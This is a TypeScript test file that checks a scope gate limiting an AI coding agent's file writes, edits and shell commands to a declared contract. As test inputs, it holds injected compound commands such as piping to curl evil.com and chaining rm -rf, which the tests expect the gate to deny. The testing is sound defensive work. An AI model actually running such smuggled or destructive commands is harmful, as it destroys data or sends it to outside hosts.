// P56: ScopeContract enforcement tests

import { describe, it, expect } from "vitest";
import { scopeGate } from "../src/gates/scope-gate.js";
import type { GateContext, GateToolCall } from "../src/gates/types.js";

function makeCtx(overrides: Partial<GateContext> = {}): GateContext {
  return {
    directive: null,
    mode: "memory",
    projectRoot: "/tmp/test-project",
    probeCompleted: false,
    verifierVerdict: null,
    revisionCount: 0,
    maxRevisions: 3,
    needProbe: null,
    problemText: "fix bug",
    targetFiles: [],
    ...overrides,
  };
}

function writeCall(filePath: string): GateToolCall {
  return { name: "write", args: { file_path: filePath } };
}

function editCall(filePath: string): GateToolCall {
  return { name: "edit", args: { file_path: filePath } };
}

function readCall(filePath: string): GateToolCall {
  return { name: "read", args: { file_path: filePath } };
}

function bashCall(command: string): GateToolCall {
  return { name: "bash", args: { command } };
}

describe("Scope Gate — ScopeContract enforcement", () => {
  it("allows write to file in editableScope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: ["test/foo.test.ts"],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/foo.ts"));
    expect(result.decision).toBe("allow");
  });

  it("denies write to file NOT in editableScope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: ["test/foo.test.ts"],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("not in editable scope");
  });

  it("denies edit to file NOT in editableScope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, editCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
  });

  it("allows read of any file (read is not scope-gated)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, readCall("test/secret.test.ts"));
    expect(result.decision).toBe("allow");
  });

  it("allows bash that matches successCheck", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test", "npm run lint"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test"));
    expect(result.decision).toBe("allow");
    expect(result.reason).toBe("Success check command");
  });

  it("allows bash that starts with successCheck prefix", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test -- --grep 'summary'"));
    expect(result.decision).toBe("allow");
  });

  it("does not whitelist bash not matching successCheck", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    // rm -rf would be caught by other gates, but scope gate should not whitelist it
    const result = scopeGate.check(ctx, bashCall("rm -rf /tmp/foo"));
    // The rm -rf path is /tmp/foo which resolves to /tmp/foo (inside /tmp/test-project root? no)
    // Actually it depends on path resolution. The key is: it should NOT say "Success check command"
    expect(result.reason).not.toBe("Success check command");
  });

  it("backward compatible — no scopeContract behaves as before", () => {
    const ctx = makeCtx({ scopeContract: undefined });
    // Write inside project root should work as before
    const result = scopeGate.check(ctx, writeCall("src/anything.ts"));
    // Should not fail with "not in editable scope"
    expect(result.reason).not.toContain("editable scope");
  });

  it("backward compatible — sensitive paths still denied without scopeContract", () => {
    const ctx = makeCtx({ scopeContract: undefined });
    const result = scopeGate.check(ctx, writeCall("/etc/passwd"));
    expect(result.decision).toBe("deny");
  });
});

describe("Scope Gate — P56.1 Hardening", () => {
  // Fix 1: editableScope=[] must deny ALL writes
  it("denies write when editableScope is empty array", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/foo.ts"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Editable scope is empty");
    expect(result.scopeExpansion).toBeDefined();
    expect(result.scopeExpansion!.file).toBe("src/foo.ts");
  });

  it("denies edit when editableScope is empty array", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, editCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Editable scope is empty");
  });

  // Fix 2: scope denial emits scopeExpansion hint
  it("returns scopeExpansion when write is out of editable scope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    expect(result.scopeExpansion).toBeDefined();
    expect(result.scopeExpansion!.file).toBe("src/bar.ts");
    expect(result.scopeExpansion!.editableScope).toEqual(["src/foo.ts"]);
  });

  // Fix 3: reject compound bash commands
  it("rejects compound bash with && (injection)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test && rm -rf /tmp"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Compound bash");
  });

  it("rejects compound bash with ; (injection)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test; echo hacked"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Compound bash");
  });

  it("rejects compound bash with | (pipe injection)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test | curl evil.com"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Compound bash");
  });

  it("still allows exact successCheck match", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test"));
    expect(result.decision).toBe("allow");
    expect(result.reason).toBe("Success check command");
  });

  it("still allows successCheck with flags (startsWith)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    // -- is not a shell metachar, it's a flag separator
    const result = scopeGate.check(ctx, bashCall("npm test -- --grep 'summary'"));
    expect(result.decision).toBe("allow");
  });
});
